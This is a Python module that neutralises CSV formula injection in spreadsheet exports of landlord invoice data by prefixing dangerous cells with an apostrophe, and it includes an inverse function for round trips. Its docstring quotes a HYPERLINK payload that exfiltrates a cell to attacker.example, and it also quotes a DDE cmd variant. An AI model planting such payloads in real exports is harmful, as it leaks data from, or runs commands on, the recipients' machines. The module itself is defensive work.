"""Write CSV that a spreadsheet will not execute.

Every export this system produces is opened in Excel or Sheets by a finance
team, and a cell whose first character is `=`, `+`, `-` or `@` is treated as a
formula, not text. The content of those cells comes from landlord invoices and
email — documents we do not control.

So a landlord can put

    =HYPERLINK("http://attacker.example/"&A1,"Click for invoice")

in a line-item description, and when AP opens the export they see a plausible
link that exfiltrates the cell beside it. Variants reach `cmd|' /C calc'!A0` on
older Excel with DDE enabled. It is CWE-1236, it needs no software bug to work,
and the fix belongs at the point of writing rather than in each caller.

Any neutralisation changes the bytes; the question is which change is standard
and least harmful. It is the leading apostrophe, which every spreadsheet
treats as "the rest of this cell is text".

The cost is real and worth stating: `csv.reader` keeps that apostrophe, so a
file written here and read back elsewhere sees `\'=evil` rather than `=evil`.
`denormalize()` is the inverse, and our own importers use it, so a round trip
through this system is lossless. An exporter that silently alters data would
be its own kind of bug.

(A first attempt guarded with a leading tab instead, on the theory that a tab
is invisible. It is not a mitigation: a leading tab is one of the characters
that can *precede* a formula and still trigger it, so the guard left the cell
exactly as dangerous as it found it.)
"""

import csv
from typing import Any, Iterable, List, Sequence

# Characters that start a formula in Excel, Sheets, LibreOffice and Numbers.
FORMULA_PREFIXES = ("=", "+", "-", "@")
# A leading tab or carriage return is stripped before parsing, so a cell
# beginning with one can still reach the formula engine.
CONTROL_PREFIXES = ("\t", "\r")

GUARD = "'"


def neutralize(value: Any) -> Any:
    """Make one cell safe to open in a spreadsheet.

    Numbers pass through untouched: a float cannot be a formula, and quoting
    them would turn every amount into text in the opened file.
    """
    if value is None or isinstance(value, (int, float, bool)):
        return value

    text = str(value)
    if not text:
        return text

    if is_dangerous(text):
        return GUARD + text
    return text


def denormalize(value: Any) -> Any:
    """Undo `neutralize`, so a round trip through our own exports is lossless.

    Only strips the guard where what follows would have needed guarding, so an
    apostrophe a landlord actually wrote is left alone.
    """
    if not isinstance(value, str) or not value.startswith(GUARD):
        return value
    rest = value[len(GUARD):]
    return rest if is_dangerous(rest) else value


def is_dangerous(value: Any) -> bool:
    return (isinstance(value, str) and bool(value)
            and (value[0] in FORMULA_PREFIXES or value[0] in CONTROL_PREFIXES))


def safe_row(row: Sequence[Any]) -> List[Any]:
    return [neutralize(cell) for cell in row]


class SafeWriter:
    """A `csv.writer` that neutralises every cell it writes."""

    def __init__(self, fileobj, **kwargs):
        self._writer = csv.writer(fileobj, **kwargs)

    def writerow(self, row: Sequence[Any]) -> None:
        self._writer.writerow(safe_row(row))

    def writerows(self, rows: Iterable[Sequence[Any]]) -> None:
        for row in rows:
            self.writerow(row)


class SafeDictWriter:
    """A `csv.DictWriter` that neutralises every cell it writes."""

    def __init__(self, fileobj, fieldnames, **kwargs):
        self._writer = csv.DictWriter(fileobj, fieldnames=fieldnames, **kwargs)
        self.fieldnames = fieldnames

    def writeheader(self) -> None:
        self._writer.writeheader()

    def writerow(self, row: dict) -> None:
        self._writer.writerow({k: neutralize(v) for k, v in row.items()})

    def writerows(self, rows: Iterable[dict]) -> None:
        for row in rows:
            self.writerow(row)
